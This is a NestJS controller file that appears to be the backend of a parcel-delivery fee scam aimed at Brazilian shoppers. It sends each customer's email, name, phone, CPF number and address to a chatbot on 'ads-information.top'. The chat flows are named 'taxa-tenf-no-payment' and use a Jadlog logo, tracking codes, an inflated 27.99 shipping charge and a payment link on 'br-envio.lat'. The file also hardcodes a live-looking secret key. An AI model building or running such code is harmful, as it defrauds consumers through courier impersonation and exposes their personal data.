import { Body, Controller, Get, HttpCode, Post, Query } from '@nestjs/common';
import { AppService } from './app.service';
import * as mongodb from 'mongodb'
import * as Minio from 'minio'
import { PrismaClient } from '@prisma/client';

var privateKey = "admin_live_YuTvvox0zgoqUVsNQLRQovZmS0BW1u"

async function startFlowTypebotTENF(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    email: item.customer.email,
    name: item.customer.name,
    phone: item.customer.phone,
    codigoRastreio: codigoRastreio,
    cep: item.customer?.address?.zipCode || "70872050",
    data: new Date().toLocaleDateString(),
    logoUrl: `https://s3.rastreou.org/cod-rastreio/sas.png`,
    horario: new Date().toLocaleTimeString(),
    endereco: item.customer.address?.street,
    state: item.customer.address?.state,
    valor: (item.amount / 100).toString(),
    frete: ((item.shipping?.amount / 100 || 0) + 27.99).toString(),
    storeName: "Refrete",
    document: item.customer.document.number,
    productsHtml: item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});

const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-dtk74jr/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
if(resp.status == 200){
  return data.messages[0].content.markdown
}
throw new Error("Erro ao iniciar chat")

}

async function startFlowTypebotREFRETE(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    email: item.customer.email,
    name: item.customer.name,
    phone: item.customer.phone,
    codigoRastreio: codigoRastreio,
    cep: item.customer?.address?.zipCode || "70872050",
    data: new Date().toLocaleDateString(),
    logoUrl: `https://s3.rastreou.org/cod-rastreio/jadlog.png`,
    horario: new Date().toLocaleTimeString(),
    endereco: item.customer.address?.street,
    state: item.customer.address?.state,
    valor: (item.amount / 100).toString(),
    frete: ((item.shipping?.amount / 100 || 0) + 27.99).toString(),
    storeName: "Refrete",
    productsHtml: item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});

const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-7x6xv4s/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
if(resp.status == 200){
  return data.messages[0].content.markdown
}
throw new Error("Erro ao iniciar chat")

}
const prisma = new PrismaClient()
const sources = [
  {
    "name": "cashtime",
    "paymentLink": "https://pay.br-envio.lat/1VOvGVroo15GD62"
  },
  {
    "name": "fivepagamentos",
    "paymentLink": ""
  }
]
const isSource = (source) => {
  return sources.map((source) => source.name).includes(source)
}


@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}
  // Set status to 200
  @Post()
  @HttpCode(201)
  async getHello(@Body() body: any, 
  @Query('source') sourceP: string,
  ) {

    if(sourceP == undefined || sourceP == null || sourceP == "") sourceP = 'fivepagamentos'
    if(!isSource(sourceP)) return "Invalid source"
    const {paymentLink} = sources.find((source) => source.name == sourceP)
    body.paymentLink = paymentLink
    switch(sourceP){
      case "cashtime":
        return await this.appService.handle(body,sourceP)
     // case "fivepagamentos":
       // return await this.appService.handle(body,sourceP)
    }
  }
}
